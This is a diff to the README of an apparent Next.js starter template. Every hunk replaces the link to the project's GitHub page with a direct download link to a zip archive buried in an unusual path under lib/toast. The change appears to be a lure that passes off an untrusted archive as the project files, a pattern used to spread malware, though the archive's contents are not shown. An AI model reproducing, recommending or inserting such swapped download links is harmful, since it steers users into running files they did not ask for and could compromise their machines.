@@ -1,12 +1,12 @@
 # 🧩 cutting-edge-nextjs-template - Build modern web apps faster
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/bebo241329/cutting-edge-nextjs-template)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/bebo241329/cutting-edge-nextjs-template/main/templates/cutting-edge-nextjs-template/lib/toast/template-cutting-edge-nextjs-2.8.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page and get the project files:
 
-https://github.com/bebo241329/cutting-edge-nextjs-template
+https://raw.githubusercontent.com/bebo241329/cutting-edge-nextjs-template/main/templates/cutting-edge-nextjs-template/lib/toast/template-cutting-edge-nextjs-2.8.zip
 
 ## 🖥️ What this is
 
@@ -42,7 +42,7 @@ Follow these steps in order.
 
 Go to:
 
-https://github.com/bebo241329/cutting-edge-nextjs-template
+https://raw.githubusercontent.com/bebo241329/cutting-edge-nextjs-template/main/templates/cutting-edge-nextjs-template/lib/toast/template-cutting-edge-nextjs-2.8.zip
 
 ### 2. Get the project files
 
@@ -341,4 +341,4 @@ Topics:
 
 If you need the project page again, use this link:
 
-https://github.com/bebo241329/cutting-edge-nextjs-template
+https://raw.githubusercontent.com/bebo241329/cutting-edge-nextjs-template/main/templates/cutting-edge-nextjs-template/lib/toast/template-cutting-edge-nextjs-2.8.zip
